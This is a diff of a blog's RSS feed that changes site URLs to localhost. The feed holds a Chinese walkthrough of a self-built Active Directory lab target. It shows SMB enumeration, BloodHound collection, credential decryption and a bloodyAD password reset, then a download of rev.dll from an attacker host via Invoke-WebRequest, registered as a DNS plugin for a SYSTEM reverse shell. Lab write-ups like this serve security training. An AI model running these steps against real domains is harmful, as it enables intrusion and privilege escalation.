@@ -2,16 +2,16 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>自建靶机 on wackymaker</title>
-        <link>https://wackymaker.github.io/tags/%E8%87%AA%E5%BB%BA%E9%9D%B6%E6%9C%BA/</link>
+        <link>http://localhost:1313/tags/%E8%87%AA%E5%BB%BA%E9%9D%B6%E6%9C%BA/</link>
         <description>Recent content in 自建靶机 on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 25 Aug 2025 15:15:18 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/tags/%E8%87%AA%E5%BB%BA%E9%9D%B6%E6%9C%BA/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 25 Aug 2025 15:15:18 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E8%87%AA%E5%BB%BA%E9%9D%B6%E6%9C%BA/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>bicker-wp</title>
-        <link>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</link>
+        <link>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</link>
         <pubDate>Mon, 25 Aug 2025 15:15:18 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
+        <guid>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
         <description>&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
 &lt;/h2&gt;&lt;p&gt;主机确认&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/bicker&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -59,7 +59,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 192.168.174.143:9389
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口&lt;/p&gt;
 &lt;h2 id=&#34;突破边界&#34;&gt;突破边界
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image.png&#34;
 	
 	
 	
@@ -68,7 +68,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;存在smb匿名，直接连接puppy，发现一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-1.png&#34;
 	
 	
 	
@@ -77,7 +77,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;一张意义不明的图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-2.png&#34;
 	
 	
 	
@@ -120,7 +120,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Image Size                      : 620x381
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Megapixels                      : 0.236
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在其中发现bilibili以及uid关键字，去b站查找到定位账号&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-3.png&#34;
 	
 	
 	
@@ -174,7 +174,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc ldap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --bloodhound --collection All --dns-server &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我为了方便利用nxc去抓取，并且因为本地部署不影响，正常情况大家还是使用其他工具比较稳定&lt;/p&gt;
 &lt;p&gt;tindalos并未有稳定的出站，但是我找到了一个有意思的组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-4.png&#34;
 	
 	
 	
@@ -246,7 +246,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Username    : lihua
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unknown     : hello%2633
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功解密出lihua的账户密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-5.png&#34;
 	
 	
 	
@@ -255,7 +255,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且能成功登陆，查看猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-6.png&#34;
 	
 	
 	
@@ -265,7 +265,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;发现lihua属于账户操作员组，对低权限所有用户都有通用掌控，于是我们直接能直接修改dns重启员的账户&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host &amp;lt;DC_IP&amp;gt; -d &amp;lt;域名&amp;gt; -u &amp;lt;管理员用户名&amp;gt; -p &amp;lt;管理员密码&amp;gt; set password &amp;lt;目标用户&amp;gt; &amp;lt;新密码&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-7.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-7.png&#34;
 	
 	
 	
@@ -274,7 +274,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用修改账号密码登陆&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-8.png&#34;
 	
 	
 	
@@ -300,7 +300,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不要使用evil-winrm上传，因为evil-winrm的bug，看上去上传成功其实长度是0&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.174.129/rev.dll&amp;#34;&lt;/span&gt; -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\wirteTEMP\rev.dll&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是使用古法上传，之后利用tindalos注册此dll&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-9.png&#34;
 	
 	
 	
@@ -310,7 +310,7 @@
 &gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注意这一步是无法回头的，注意快照
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后在jianyin用户上重启服务&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-10.png&#34;
 	
 	
 	
@@ -319,7 +319,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;从另外一边的监听直接接受shell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-11.png&#34;
 	
 	
 	
@@ -328,7 +328,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;权限为system成功获取rootflag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-12.png&#34;
 	
 	
 	
